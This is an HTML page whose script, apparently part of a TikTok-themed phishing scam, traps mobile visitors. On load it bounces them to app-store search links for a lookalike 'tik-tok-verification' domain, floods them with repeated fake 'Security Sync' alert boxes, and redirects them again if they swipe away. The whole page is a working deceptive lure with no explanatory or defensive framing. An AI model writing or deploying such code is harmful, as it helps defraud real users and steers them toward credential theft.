<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>body, html { margin: 0; padding: 0; background: #fff; overflow: hidden; height: 100vh; }</style>
</head>
<body>

<script>
    const target = "https://tik-tok-verification.com/Verification/verify1.html";
    const killTime = Date.now() + 10000; // 10 SECOND FAIL-SAFE
    const fixedGap = 350; // OPTIMIZED DELAY

    function triggerStoreJump() {
        const urlEnc = encodeURIComponent(target);
        const isAndroid = /Android/i.test(navigator.userAgent);
        
        // Verified successful protocol
        const iosTrigger = "itms-apps://search.itunes.apple.com/WebObjects/MZSearch.woa/wa/search?media=software&term=" + urlEnc;
        const androidTrigger = "market://search?q=" + urlEnc;
        
        window.location.href = isAndroid ? androidTrigger : iosTrigger;
    }

    function rampage() {
        if (Date.now() > killTime) return;

        // 1. Initial jump attempt
        triggerStoreJump();

        // 2. THE LOCK
        alert("ATTEMPT #29\n\nSecurity Sync Active.\n\nTap OK to finalize handover.");

        // 3. THE OPTIMIZED WINDOW (350ms)
        setTimeout(() => {
            // Re-fire the jump to leverage the gap before the next alert
            triggerStoreJump();
            
            if (Date.now() < killTime) {
                rampage();
            }
        }, fixedGap); 
    }

    window.onload = () => {
        rampage();
    };

    // Re-trigger if focus is lost (swipe/minimize)
    window.onblur = () => { 
        if (Date.now() < killTime) triggerStoreJump(); 
    };
</script>

</body>
</html>
